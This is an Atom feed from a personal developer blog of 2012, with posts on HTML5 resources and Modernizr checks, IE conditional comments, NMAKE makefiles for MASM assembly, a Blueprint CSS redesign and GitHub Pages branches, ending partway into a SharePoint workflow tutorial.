<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
 
 <title>Madhur's Blog</title>
 <link href="http://madhur.co.in/atom.xml" rel="self"/>
 <link href="http://madhur.co.in/blogindex.html/"/>
 <updated>2012-02-26T02:01:56+05:30</updated>
 <id>http://madhur.co.in/blogindex.html</id>
 <author>
   <name>Madhur Ahuja</name>
   <email>ahuja.madhur@gmail.com</email>
 </author>
 
 
 <entry>
   <title>Learning HTML5</title>
   <link href="http://madhur.co.in/blog/2012/02/20/learnhtml5.html"/>
   <updated>2012-02-20T00:00:00+05:30</updated>
   <id>id:/blog/2012/02/20/learnhtml5</id>
   <content type="html">&lt;p&gt;I came across two excellent sites to learn HTML5:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href='http://html5demos.com/'&gt;HTML 5 Demos&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;a href='http://diveintohtml5.ep.io/index.html'&gt;Dive into HTML5&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;a href='http://html5boilerplate.com/'&gt;HTML5 BoilerPlate&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;a href='http://html5test.com'&gt;HTML 5 Test&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id='detecting_html_5_features'&gt;Detecting HTML 5 Features&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://www.modernizr.com/'&gt;Modernizr&lt;/a&gt; is an open source, MIT-licensed JavaScript library that detects support for many HTML5 &amp;amp; CSS3 features. For example, following are the results from your browser:&lt;/p&gt;

&lt;h2 id='html_5_features_detected'&gt;HTML 5 Features Detected&lt;/h2&gt;

&lt;h3 id='canvas'&gt;Canvas&lt;/h3&gt;
&lt;script type='text/javascript'&gt;
if(Modernizr.canvas)
	document.write(&quot;&lt;div class='success'&gt;Canvas is supported&lt;/div&gt;&quot;);
else
	document.write(&quot;&lt;div class='error'&gt;Canvas is not supported&lt;/div&gt;&quot;);

&lt;/script&gt;
&lt;h3 id='video'&gt;Video&lt;/h3&gt;
&lt;script type='text/javascript'&gt;
if(Modernizr.video)
	document.write(&quot;&lt;div class='success'&gt;Video is supported&lt;/div&gt;&quot;);
else
	document.write(&quot;&lt;div class='error'&gt;Video is not supported&lt;/div&gt;&quot;);

&lt;/script&gt;
&lt;h3 id='localstorage'&gt;LocalStorage&lt;/h3&gt;
&lt;script type='text/javascript'&gt;
if(Modernizr.localstorage)
	document.write(&quot;&lt;div class='success'&gt;LocalStorage is supported&lt;/div&gt;&quot;);
else
	document.write(&quot;&lt;div class='error'&gt;LocalStorage is not supported&lt;/div&gt;&quot;);

&lt;/script&gt;
&lt;h3 id='web_workers'&gt;Web Workers&lt;/h3&gt;
&lt;script type='text/javascript'&gt;
if(Modernizr.webworkers)
	document.write(&quot;&lt;div class='success'&gt;Web Workers is supported&lt;/div&gt;&quot;);
else
	document.write(&quot;&lt;div class='error'&gt;Web Workers is not supported&lt;/div&gt;&quot;);

&lt;/script&gt;
&lt;h3 id='offline_web_applications'&gt;Offline Web Applications&lt;/h3&gt;

&lt;h3 id='geolocation'&gt;GeoLocation&lt;/h3&gt;
&lt;script type='text/javascript'&gt;
if(Modernizr.geolocation)
	document.write(&quot;&lt;div class='success'&gt;GeoLocation is supported&lt;/div&gt;&quot;);
else
	document.write(&quot;&lt;div class='error'&gt;GeoLocation is not supported&lt;/div&gt;&quot;);

&lt;/script&gt;
&lt;h3 id='input_types'&gt;Input Types&lt;/h3&gt;

&lt;h3 id='placeholder_text'&gt;PlaceHolder Text&lt;/h3&gt;

&lt;h3 id='form_autofocus'&gt;Form Autofocus&lt;/h3&gt;

&lt;h3 id='history_api'&gt;History API&lt;/h3&gt;
&lt;script type='text/javascript'&gt;
if(Modernizr.history)
	document.write(&quot;&lt;div class='success'&gt;History API is supported&lt;/div&gt;&quot;);
else
	document.write(&quot;&lt;div class='error'&gt;History API is not supported&lt;/div&gt;&quot;);

&lt;/script&gt;</content>
 </entry>
 
 <entry>
   <title>Conditional comments in Internet Explorer</title>
   <link href="http://madhur.co.in/blog/2012/02/20/conditionalcommentsie.html"/>
   <updated>2012-02-20T00:00:00+05:30</updated>
   <id>id:/blog/2012/02/20/conditionalcommentsie</id>
   <content type="html">&lt;p&gt;Since IE5, Internet Explorer supports something called &lt;a href='http://en.wikipedia.org/wiki/Conditional_comment'&gt;Conditional Comments&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Conditional comments can be used to provide and hide code to and from Internet Explorer. For example, I can find the version of Internet Explorer you are running as follows:&lt;/p&gt;
&lt;div class='notice'&gt;
&lt;!--[if IE]&gt;
According to the conditional comment this is IE&lt;br /&gt;
&lt;![endif]--&gt;
&lt;!--[if IE 6]&gt;
According to the conditional comment this is IE 6&lt;br /&gt;
&lt;![endif]--&gt;
&lt;!--[if IE 7]&gt;
According to the conditional comment this is IE 7&lt;br /&gt;
&lt;![endif]--&gt;
&lt;!--[if IE 8]&gt;
According to the conditional comment this is IE 8&lt;br /&gt;
&lt;![endif]--&gt;
&lt;!--[if IE 9]&gt;
According to the conditional comment this is IE 9&lt;br /&gt;
&lt;![endif]--&gt;
&lt;!--[if gte IE 8]&gt;
According to the conditional comment this is IE 8 or higher&lt;br /&gt;
&lt;![endif]--&gt;
&lt;!--[if lt IE 9]&gt;
According to the conditional comment this is IE lower than 9&lt;br /&gt;
&lt;![endif]--&gt;
&lt;!--[if lte IE 7]&gt;
According to the conditional comment this is IE lower or equal to 7&lt;br /&gt;
&lt;![endif]--&gt;
&lt;!--[if gt IE 6]&gt;
According to the conditional comment this is IE greater than 6&lt;br /&gt;
&lt;![endif]--&gt;
&lt;!--[if !IE]&gt; --&gt;
According to the conditional comment this is not IE&lt;br /&gt;
&lt;!-- &lt;![endif]--&gt;
&lt;/div&gt;
&lt;p&gt;The snippet below is used to show this:&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;&amp;lt;!--[if IE]&amp;gt;
According to the conditional comment this is IE&amp;lt;br /&amp;gt;
&amp;lt;![endif]--&amp;gt;
&amp;lt;!--[if IE 6]&amp;gt;
According to the conditional comment this is IE 6&amp;lt;br /&amp;gt;
&amp;lt;![endif]--&amp;gt;
&amp;lt;!--[if IE 7]&amp;gt;
According to the conditional comment this is IE 7&amp;lt;br /&amp;gt;
&amp;lt;![endif]--&amp;gt;
&amp;lt;!--[if IE 8]&amp;gt;
According to the conditional comment this is IE 8&amp;lt;br /&amp;gt;
&amp;lt;![endif]--&amp;gt;
&amp;lt;!--[if IE 9]&amp;gt;
According to the conditional comment this is IE 9&amp;lt;br /&amp;gt;
&amp;lt;![endif]--&amp;gt;
&amp;lt;!--[if gte IE 8]&amp;gt;
According to the conditional comment this is IE 8 or higher&amp;lt;br /&amp;gt;
&amp;lt;![endif]--&amp;gt;
&amp;lt;!--[if lt IE 9]&amp;gt;
According to the conditional comment this is IE lower than 9&amp;lt;br /&amp;gt;
&amp;lt;![endif]--&amp;gt;
&amp;lt;!--[if lte IE 7]&amp;gt;
According to the conditional comment this is IE lower or equal to 7&amp;lt;br /&amp;gt;
&amp;lt;![endif]--&amp;gt;
&amp;lt;!--[if gt IE 6]&amp;gt;
According to the conditional comment this is IE greater than 6&amp;lt;br /&amp;gt;
&amp;lt;![endif]--&amp;gt;
&amp;lt;!--[if !IE]&amp;gt; --&amp;gt;
According to the conditional comment this is not IE&amp;lt;br /&amp;gt;
&amp;lt;!-- &amp;lt;![endif]--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Also, checkout conditional comments on &lt;a href='http://msdn.microsoft.com/en-us/library/ms537512.aspx'&gt;MSDN&lt;/a&gt;&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>Future of Web and Mobile: HTML5, CSS3 and Javascript</title>
   <link href="http://madhur.co.in/blog/2012/02/15/futurewebmobile.html"/>
   <updated>2012-02-15T00:00:00+05:30</updated>
   <id>id:/blog/2012/02/15/futurewebmobile</id>
   <content type="html">&lt;p&gt;If somebody had asked me 5 years ago, what are the next big web technologies on the horizon ? What would my answer would have been?&lt;/p&gt;

&lt;p&gt;AJAX, Flash or perhaps Silverlight ?&lt;/p&gt;

&lt;p&gt;The scene has changed from then. Now its the HTML5, CSS3 and Javascript which are the future of web technologies. This change has come gradually due to some reasons:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Tremendous rise in popularity of Javascript:&lt;/strong&gt; Few years back, developers used to hate write javascript code. Partially because its loosely typed and perhaps more because each browser has got its own JavaECMAScript implementation. &lt;a href='http://jquery.com'&gt;Jquery project&lt;/a&gt; has greatly simplified the effort required in maintaining cross-browser client side script. And slowly, javascript is being loved by developers. One of the reason of this is change is due to emergence of standard coding design patterns in javascript. Earlier developers were unaware that object oriented concepts like classes, objects, encapsulation, inheritance could be applied to javascript. But now, these has become very standard design patterns. JavaScript is better than it&amp;#8217;s ever been&lt;/p&gt;

&lt;p&gt;Have a look at these popular javascript based projects which have contributed to rise in popularity of this language.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href='http://jquery.com/'&gt;Jquery&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='http://headjs.com/'&gt;HeadJS&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='http://knockoutjs.com/'&gt;KnockoutJS&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Emergence of HTML5:&lt;/strong&gt; W3C consortium has come up with new standard for HTML which includes advanced functionalities like local storage, audio and video. Since HTML5 is going to be uniquitous standard, it seems it is going to replace technologies like Silverlight and Flash.&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CSS3:&lt;/strong&gt; &lt;a href='http://en.wikipedia.org/wiki/Cascading_Style_Sheets#CSS3'&gt;CSS3&lt;/a&gt; further adds the power to HTML5.&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Mobile:&lt;/strong&gt; Perhaps one of the biggest push these three technologies (HTML5, CSS3 and Javascript) has got is in area of Mobile. More and more mobile frameworks (Android, IOS and WP7) are increasingly starting to use these technologies as the base for their front end.&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Browser Extensions:&lt;/strong&gt; The war of browser between IE, Mozilla and Chrome has resulted in browser extensions. These extensions are particularly popular in Chrome and Mozilla browsers. And guess what ? Writing a custom extension for these browser require skills in HTML and Javascript.&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Windows 8:&lt;/strong&gt; The next version of Microsoft Windows OS is going to use a new UI called &lt;a href='http://en.wikipedia.org/wiki/Metro_(design_language'&gt;Metro&lt;/a&gt;. And apart from using Managed code such as C# and VB.NET , you can create Metro Style apps in javascritp as well. See the article &lt;a href='http://msdn.microsoft.com/en-us/library/windows/apps/br211385.aspx'&gt;Building your first Windows Metro style app using JavaScript&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It looks clear to me that HTML5, CSS3 and Javascript is going to be future for building rich UI apps on Web and mobile or perhaps even desktop. What do you think ?&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>Using MakeFile with Assembly Programming</title>
   <link href="http://madhur.co.in/blog/2012/02/08/makefileassembly.html"/>
   <updated>2012-02-08T00:00:00+05:30</updated>
   <id>id:/blog/2012/02/08/makefileassembly</id>
   <content type="html">&lt;p&gt;I have been a big fan of assembly programming since my old school days. The raw power of CPU which you get is just pure awesome. But, with that power, you also get much headache of non-availablity of standard IDE&amp;#8217;s for using Assembly language.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Visual Studio is one of the options, but it restricts you to the installed version of Microsoft Macro Assembler (ml.exe)&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;Some prefer using QEditor.exe which ships with &lt;a href='http://masm32.com'&gt;MASM32 SDK&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;Some like me, just cannot stay away from there favourite editors such as Notepad++, Ultraedit etc.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The benefit of using editors such as Notepad++, Ultraedit is that you get fully customizable syntax highlighting and command line tools to be used while assembling and linking their programs. However, with these tools you have to add commands to both assemble and link your programs. And if you are like me, who fiddles with 16bit, 32bit and 64 bit assembly programs, you have to add seperate commands for them. And not to forget, seperate commands for outputting debug and release binaries as well.&lt;/p&gt;

&lt;p&gt;To simplify the above process, I have been exploring the use of makefiles to assemble and link my programs and this has worked wonderfully well. I just maintain my each assembly project in seperate directory with the makefile and use that as a command to assembly and link the program from &lt;a href='http://notepad-plus-plus.org/'&gt;Notepad++&lt;/a&gt;, using &lt;a href='https://sourceforge.net/projects/npp-plugins/files/NppExec/'&gt;NppExec plugin&lt;/a&gt;. Apart from Notepad++, I am using following tools as my development environment. You might be using different, but they can be applied in same concept.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;NMAKE(nmake.exe) v10.00.30319.01 which ships with Visual Studio 2010 available &lt;a href='http://www.microsoft.com/visualstudio/en-in'&gt;here&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;Borland Resource compiler (brcc32.exe) v4.50 which ships with Borland compiler tools available somewhere on the net&lt;/li&gt;

&lt;li&gt;Microsoft Macro Assembler(ml.exe) v6.14 and Linker (link.exe) v5.12 which ships with Masm 32 SDK available &lt;a href='http://www.masm32.com/'&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Note that all the above tools should be put preferable in the PATH variable for easy access. I do this by creating a simple command script as follows:&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;setx PATH &amp;quot;f:\common tools\git\bin;f:\common tools\python\app;f:\common tools\python\app\scripts;f:\common tools\ruby\bin;f:\masm32\bin;F:\Borland\BCC55\Bin;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;I am going to show you some scenarios here on how I am using Makefiles to assemble and link my programs. Note that this is not a tutorial for using makefiles. I assume you have some basic familiarity with it. If not, you can browse some excellent tutorials &lt;a href='http://web.sau.edu/lilliskevinm/csci240/masmdocs/envtools/26LMAETC16.pdf'&gt;here&lt;/a&gt; and &lt;a href='http://webster.cs.ucr.edu/AoA/DOS/ch08/CH08-10.html#HEADING10-131'&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A Win32 Assembly program without the use of resources:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='makefile'&gt;&lt;span class='nv'&gt;MASMPATH&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;F:&lt;span class='se'&gt;\M&lt;/span&gt;ASM32
&lt;span class='nv'&gt;ML&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;ml
&lt;span class='nv'&gt;DEBUG&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt; 1
!IF &lt;span class='k'&gt;$(&lt;/span&gt;DEBUG&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='o'&gt;==&lt;/span&gt;1
&lt;span class='nv'&gt;CFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;/c /coff /Zd /Zi /Fl /Sn /nologo /I
!ELSE
&lt;span class='nv'&gt;CFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;/c /coff /Fl /Sn /nologo /I
!ENDIF
&lt;span class='nv'&gt;LDFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;
&lt;span class='nv'&gt;SOURCES&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;trans.asm
&lt;span class='nv'&gt;OBJECTS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='k'&gt;$(&lt;/span&gt;SOURCES:.asm&lt;span class='o'&gt;=&lt;/span&gt;.obj&lt;span class='k'&gt;)&lt;/span&gt;
&lt;span class='nv'&gt;PROJ&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;trans.exe


&lt;span class='k'&gt;$(&lt;/span&gt;PROJ&lt;span class='k'&gt;)&lt;/span&gt;: &lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;
	link /NOLOGO /SUBSYSTEM:WINDOWS /LIBPATH:&lt;span class='k'&gt;$(&lt;/span&gt;MASMPATH&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='se'&gt;\L&lt;/span&gt;IB &lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;
	
&lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;: &lt;span class='k'&gt;$(&lt;/span&gt;SOURCES&lt;span class='k'&gt;)&lt;/span&gt;
	&lt;span class='k'&gt;$(&lt;/span&gt;ML&lt;span class='k'&gt;)&lt;/span&gt; &lt;span class='k'&gt;$(&lt;/span&gt;CFLAGS&lt;span class='k'&gt;)&lt;/span&gt; &lt;span class='k'&gt;$(&lt;/span&gt;MASMPATH&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='se'&gt;\i&lt;/span&gt;nclude &lt;span class='k'&gt;$(&lt;/span&gt;SOURCES&lt;span class='k'&gt;)&lt;/span&gt; 
	
clean:
	del *.exe
	del *.obj
	del *.lst
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;A win32 Assembly program with the use of resources:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='makefile'&gt;&lt;span class='nv'&gt;MASMPATH&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;F:&lt;span class='se'&gt;\M&lt;/span&gt;ASM32
&lt;span class='nv'&gt;ML&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;ml
&lt;span class='nv'&gt;DEBUG&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt; 1
!IF &lt;span class='k'&gt;$(&lt;/span&gt;DEBUG&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='o'&gt;==&lt;/span&gt;1
&lt;span class='nv'&gt;CFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;/c /coff /Zd /Zi /Fl /Sn /nologo /I
!ELSE
&lt;span class='nv'&gt;CFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;/c /coff /Fl /Sn /nologo /I
!ENDIF
&lt;span class='nv'&gt;LDFLAGS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;
&lt;span class='nv'&gt;SOURCES&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;vaoffset.asm
&lt;span class='nv'&gt;RESOURCES&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;vaoffset.rc
&lt;span class='nv'&gt;OBJECTS&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='k'&gt;$(&lt;/span&gt;SOURCES:.asm&lt;span class='o'&gt;=&lt;/span&gt;.obj&lt;span class='k'&gt;)&lt;/span&gt; vaoffset.res
&lt;span class='nv'&gt;PROJ&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;vaoffset.exe


&lt;span class='k'&gt;$(&lt;/span&gt;PROJ&lt;span class='k'&gt;)&lt;/span&gt;: &lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;
	link /NOLOGO /SUBSYSTEM:WINDOWS /LIBPATH:&lt;span class='k'&gt;$(&lt;/span&gt;MASMPATH&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='se'&gt;\L&lt;/span&gt;IB /LIBPATH:f:&lt;span class='se'&gt;\p&lt;/span&gt;rojects&lt;span class='se'&gt;\p&lt;/span&gt;rograms&lt;span class='se'&gt;\w&lt;/span&gt;insock&lt;span class='se'&gt;\n&lt;/span&gt;etsend &lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;
	
&lt;span class='k'&gt;$(&lt;/span&gt;OBJECTS&lt;span class='k'&gt;)&lt;/span&gt;: &lt;span class='k'&gt;$(&lt;/span&gt;SOURCES&lt;span class='k'&gt;)&lt;/span&gt;
	&lt;span class='k'&gt;$(&lt;/span&gt;ML&lt;span class='k'&gt;)&lt;/span&gt; &lt;span class='k'&gt;$(&lt;/span&gt;CFLAGS&lt;span class='k'&gt;)&lt;/span&gt; &lt;span class='k'&gt;$(&lt;/span&gt;MASMPATH&lt;span class='k'&gt;)&lt;/span&gt;&lt;span class='se'&gt;\i&lt;/span&gt;nclude &lt;span class='k'&gt;$(&lt;/span&gt;SOURCES&lt;span class='k'&gt;)&lt;/span&gt; 
	C:&lt;span class='se'&gt;\B&lt;/span&gt;orland&lt;span class='se'&gt;\B&lt;/span&gt;CC55&lt;span class='se'&gt;\B&lt;/span&gt;in&lt;span class='se'&gt;\b&lt;/span&gt;rcc32.exe vaoffset.rc
	
	
clean:
	del *.exe
	del *.obj
	del *.lst
	
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Now, Provided &lt;strong&gt;NMAKE&lt;/strong&gt; is in your path variable, you can simply set a command in Notepad++ or in your favourite text editor to invoke nmake in current directory.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;F:\projects\programs\WIN32ASM\transparent&amp;gt;nmake /U

Microsoft (R) Program Maintenance Utility Version 10.00.30319.01
Copyright (C) Microsoft Corporation.  All rights reserved.

        ml /c /coff /Zd /Zi /Fl /Sn /nologo /I F:\MASM32\include trans.asm
 Assembling: trans.asm
        link /NOLOGO /SUBSYSTEM:WINDOWS /LIBPATH:F:\MASM32\LIB trans.obj
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;And to clean the output,&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;F:\projects\programs\WIN32ASM\transparent&amp;gt;nmake clean

Microsoft (R) Program Maintenance Utility Version 10.00.30319.01
Copyright (C) Microsoft Corporation.  All rights reserved.

        del *.exe
        del *.obj
        del *.lst		
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Updated with Blueprint CSS Framework</title>
   <link href="http://madhur.co.in/blog/2012/02/02/updateblueprintcss.html"/>
   <updated>2012-02-02T00:00:00+05:30</updated>
   <id>id:/blog/2012/02/02/updateblueprintcss</id>
   <content type="html">&lt;p&gt;I have updated this Jekyll site with &lt;a href='http://blueprintcss.org/'&gt;BluePrint CSS Framework&lt;/a&gt;. For those are not familiar with Blueprint, Blueprint is a grid based CSS framework. The grid is 950px wide, with 24 columns spanning 30px, and a 10px margin between columns. First step in designing the layout is to surround your grid with a container and use div&amp;#8217;s with one of the .span-x classes to set the number of columns the elements should span. The &lt;strong&gt;last&lt;/strong&gt; class, which every last element inside a container or another column needs.&lt;/p&gt;

&lt;p&gt;Earlier, I had a lot of different CSS files to maintain this page. After revamp, here is how my head section looks:&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='html'&gt;	&lt;span class='nt'&gt;&amp;lt;link&lt;/span&gt; &lt;span class='na'&gt;rel=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class='na'&gt;href=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;/files/css/blueprint/screen.css&amp;quot;&lt;/span&gt; &lt;span class='na'&gt;type=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt; &lt;span class='nt'&gt;/&amp;gt;&lt;/span&gt;  
	&lt;span class='nt'&gt;&amp;lt;link&lt;/span&gt; &lt;span class='na'&gt;rel=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class='na'&gt;href=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;/files/css/site.css&amp;quot;&lt;/span&gt; &lt;span class='na'&gt;type=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt; &lt;span class='nt'&gt;/&amp;gt;&lt;/span&gt;	
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;I use &lt;strong&gt;&lt;em&gt;screen.css, print.css&lt;/em&gt;&lt;/strong&gt; from the framework and just override the styles in &lt;strong&gt;&lt;em&gt;site.css&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Achieving the sidebars, present on this site is very simple. We just add the relevant classes such as &lt;strong&gt;span-x&lt;/strong&gt; depending upon the width you need. In my case, I divided into two blocks consisting of 6 and 18 columns respectively.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='html'&gt;&lt;span class='nt'&gt;&amp;lt;div&lt;/span&gt; &lt;span class='na'&gt;id=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;primary&amp;quot;&lt;/span&gt; &lt;span class='na'&gt;class=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;span-18&amp;quot;&lt;/span&gt;&lt;span class='nt'&gt;&amp;gt;&lt;/span&gt;
	
&lt;span class='nt'&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

&lt;span class='nt'&gt;&amp;lt;div&lt;/span&gt; &lt;span class='na'&gt;id=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;secondary&amp;quot;&lt;/span&gt; &lt;span class='na'&gt;class=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;span-6 last&amp;quot;&lt;/span&gt;&lt;span class='nt'&gt;&amp;gt;&lt;/span&gt;
	
&lt;span class='nt'&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;You may not notice any change in look and feel of the site, but internally its CSS structure has been completely re-designed.&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>GitHub Pages are served from the Default Branch</title>
   <link href="http://madhur.co.in/blog/2012/02/02/githubpages.html"/>
   <updated>2012-02-02T00:00:00+05:30</updated>
   <id>id:/blog/2012/02/02/githubpages</id>
   <content type="html">&lt;p&gt;Yesterday, after a simple commit, my entire site went down. I spent entire day troubleshotting the issue. In the end, the resolution was simple: change the default branch.&lt;/p&gt;

&lt;p&gt;The &lt;a href='http://pages.github.com/'&gt;GitHub Pages documentation&lt;/a&gt; says that you can push a file named &lt;strong&gt;index.html&lt;/strong&gt; onto your &lt;strong&gt;master&lt;/strong&gt; branch to make it automatically available at &lt;strong&gt;username.github.com&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Let&amp;#8217;s say your GitHub username is &amp;#8220;Alice&amp;#8221; If you create a GitHub repository named alice.github.com, commit a file named index.html into the master branch, and push it to GitHub, then this file will be automatically published to http://alice.github.com/.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;What it doesn&amp;#8217;t say that, it will not work if you have changed your default branch from &lt;strong&gt;master&lt;/strong&gt; to something else. In that case, &lt;strong&gt;index.html&lt;/strong&gt; should be pushed to default branch.&lt;/p&gt;

&lt;p&gt;Since I use Jekyll with custom plugins, I maintain two branches: &lt;strong&gt;Source&lt;/strong&gt; to store source Jekyll files and &lt;strong&gt;master&lt;/strong&gt; for the published content. I had mistakenly set the &lt;strong&gt;source&lt;/strong&gt; branch to be default rendering the whole site to be unavailable.&lt;/p&gt;

&lt;p&gt;In nutshell, always remember that pages are always served from the default branch and not &lt;strong&gt;master&lt;/strong&gt; branch.&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>Invoke SharePoint 2010 Approval Workflow with Dynamic Approvers using Web Services and Jquery</title>
   <link href="http://madhur.co.in/blog/2012/01/09/spworkflowapprovers.html"/>
   <updated>2012-01-09T00:00:00+05:30</updated>
   <id>id:/blog/2012/01/09/spworkflowapprovers</id>
   <content type="html">&lt;p&gt;In this post, I am going to show you how you can execute out of the box SharePoint 2010 approval workflow with dynamic approvers.&lt;/p&gt;

&lt;p&gt;Let&amp;#8217;s say, you have a list on which you have Approval workflow configured and you want the approver to be picked from the Person or Group type field from within the list.&lt;/p&gt;

&lt;p&gt;Let&amp;#8217;s assume , the ID is being specified in the query string of the page such as&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;StartWorfklow.aspx?ItemID=5&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I will be making use of &lt;a href='http://jquery.com'&gt;Jquery&lt;/a&gt; and &lt;a href='http://spservices.codeplex.com'&gt;SPServices&lt;/a&gt; from codeplex for this purpose.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;First of all, we will retrieve the our specified item from this list and then retrieve the value of this Person or Group field.&lt;/li&gt;
&lt;/ul&gt;
